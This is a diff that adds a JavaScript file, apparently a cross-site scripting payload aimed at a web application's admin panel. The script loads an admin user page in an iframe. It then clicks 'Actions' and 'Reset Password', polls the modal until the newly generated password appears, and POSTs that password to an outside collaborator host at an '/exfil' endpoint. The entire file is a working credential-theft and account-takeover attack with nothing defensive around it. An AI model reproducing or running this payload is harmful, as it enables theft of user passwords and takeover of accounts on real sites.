@@ -1,0 +1,68 @@
+const f = document.createElement("iframe");
+f.src = "https://somevulnerablesite.com/admin/users/01KBZ8VGW0GE3KJDWKCJEZ6THT";
+document.body.appendChild(f);
+
+f.onload = () => {
+    const doc = f.contentDocument;  
+    // run your script against doc
+};
+
+  setTimeout(() => {
+    // 1. Click the "Actions" button to open the dropdown
+    document.querySelector("button[aria-expanded='false'][data-toggle='dropdown']").click();
+
+    // 2. Wait for the dropdown to open and click "Reset Password"
+    setTimeout(() => {
+      const resetPasswordButton = document.querySelector("a.dropdown-item[href='#']");
+      if (resetPasswordButton) {
+        resetPasswordButton.click();  // Click the "Reset Password" option
+      } else {
+        console.log('"Reset Password" not found.');
+      }
+    }, 1000);  // Wait 1 second for the dropdown to open
+
+    // 3. Wait for the modal to appear and use polling to find the password
+    setTimeout(() => {
+      const resetPasswordModal = document.querySelector('#resetDetailsModal');
+      if (resetPasswordModal && resetPasswordModal.style.display !== 'none') {
+        console.log('Modal visible:', resetPasswordModal);
+
+        // Polling to check if the password has been rendered
+        const interval = setInterval(() => {
+          const passwordElement = document.querySelector('div.modal-body p:last-of-type');
+
+          // Check if the password element has the text we are looking for
+          if (passwordElement && passwordElement.innerText.trim() !== "") {
+            const password = passwordElement.innerText.trim();  // Get the password
+            console.log('The new password is:', password);
+
+            // EXFILTRATION: Send the password using a POST request to a remote server
+            const formData = new FormData();
+            formData.append('password', password);
+
+            fetch('https://collaborator.oastify.com/exfil', {
+              method: 'POST',
+              body: formData
+            })
+            .then(response => {
+              if (response.ok) {
+                console.log('Password successfully exfiltrated!');
+              } else {
+                console.log('Failed to exfiltrate password');
+              }
+            })
+            .catch(err => {
+              console.error('Error during password exfiltration:', err);
+            });
+
+            // Stop the polling once the password is found
+            clearInterval(interval);
+          }
+        }, 500);  // Check every 500ms for the password to appear
+
+      } else {
+        console.log('Modal is not visible or not found.');
+      }
+    }, 3000);  // Wait 3 seconds for the modal to appear
+  }, 1000);  // Initial delay before performing actions
+
